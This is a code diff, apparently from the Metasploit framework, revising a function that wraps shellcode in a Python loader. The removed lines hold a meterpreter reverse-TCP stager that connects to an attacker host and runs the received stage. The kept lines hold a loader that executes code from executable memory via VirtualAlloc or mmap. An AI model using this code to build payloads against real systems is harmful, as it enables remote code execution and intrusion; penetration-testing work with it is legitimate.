@@ -1438,43 +1438,19 @@ require 'msf/core/exe/segment_appender'
   end
 
   def self.to_python_reflection(framework, arch, code, exeopts)
-    if arch != ARCH_X64 and arch != ARCH_X86
+    unless [ ARCH_X86, ARCH_X64, ARCH_AARCH64, ARCH_ARMLE, ARCH_MIPSBE, ARCH_MIPSLE, ARCH_PPC ].include? arch
       raise RuntimeError, "Msf::Util::EXE.to_python_reflection is not compatible with #{arch}"
     end
-    python_code = 'import ctypes,os'
-    load_socket_nt = ''
-    load_socket_posix = ''
-    payload = exeopts[:payload]
-    if payload.end_with?('meterpreter/reverse_tcp')
-      if not exeopts[:lhost] and exeopts[:lport]
-        raise RuntimeError, 'Msf::Util::EXE.to_python_reflection called without LHOST and LPORT'
-      end
-      python_code += ",socket,struct
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(('#{exeopts[:lhost]}',#{exeopts[:lport]}))
-buf = b'\\xbf'+struct.pack('<L', s.fileno())
-"
-      load_socket_nt = "
-  stagelen = struct.unpack('<L', s.recv(4))[0]
-  while stagelen>0:
-    chunk = s.recv(stagelen)
-    if chunk == '':
-        break
-    buf += bytearray(chunk)
-    stagelen -= len(chunk)"
-      load_socket_posix = "
-  buf += s.recv(4096)"
-    else
-      python_code += "\n" + Rex::Text.to_python(code)
-    end
-    python_code += %(if os.name == 'nt':#{load_socket_nt}
+    python_code = %(#{Rex::Text.to_python(code)}
+import ctypes,os
+if os.name == 'nt':
   cbuf = (ctypes.c_char * len(buf)).from_buffer_copy(buf)
   ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
   ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_long(0),ctypes.c_long(len(buf)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
   ctypes.windll.kernel32.RtlMoveMemory.argtypes = [ctypes.c_void_p,ctypes.c_void_p,ctypes.c_int]
   ctypes.windll.kernel32.RtlMoveMemory(ptr,cbuf,ctypes.c_int(len(buf)))
   ctypes.CFUNCTYPE(ctypes.c_int)(ptr)()
-else:#{load_socket_posix}
+else:
   import mmap
   from ctypes.util import find_library
   c = ctypes.CDLL(find_library('c'))
